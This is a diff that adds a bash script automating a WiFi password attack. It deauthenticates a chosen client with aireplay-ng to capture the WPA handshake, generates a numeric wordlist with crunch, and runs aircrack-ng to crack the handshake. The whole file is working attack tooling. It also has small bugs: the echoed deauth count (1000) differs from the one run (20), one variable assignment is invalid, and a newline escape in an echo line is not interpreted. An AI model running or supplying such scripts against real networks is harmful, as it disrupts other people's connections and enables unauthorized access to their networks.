@@ -1,0 +1,26 @@
+#!/bin/bash
+echo "~~Continue in the first terminal until you get the target device information"
+echo ~~Enter the following parameters :
+read -p "	Network BSSID: " nBSSID
+read -p "	Client BSSID: " cBSSID
+read -p "	Inteface name in monitor mode, press enter to continue with 'wlan0': " interfaceName
+ if [[ $interfaceName ]]
+then
+      interfaceName = $interfaceName
+else
+      interfaceName="wlan0"
+fi
+echo ~~Starting the attack \"aireplay-ng --deauth 1000 -a $nBSSID -c $cBSSID $interfaceName\"
+aireplay-ng --deauth 20 -a $nBSSID -c $cBSSID $interfaceName
+echo ~~Once the handshake is captured, close the first terminal to save the file
+echo ~~Use \'crunch\' to generate a word list \"crunch 8 8 123456789 -t 123456@@ -o myWordList\" 
+crunch 8 8 123456789 -t 123456@@ -o myWordList
+echo ~~Now use \'aircrack-ng\' to try all the passwords in the word list created, \n before that you need to set the following parameters: 
+read -p "	Handshake filename: " HF
+read -p "	Wordlist filename: " WF
+echo ~~Starting the attack \"aircrack-ng $HF -w $WF\"
+aircrack-ng $HF-01.cap -w $WF
+read -p "" n
+
+
+
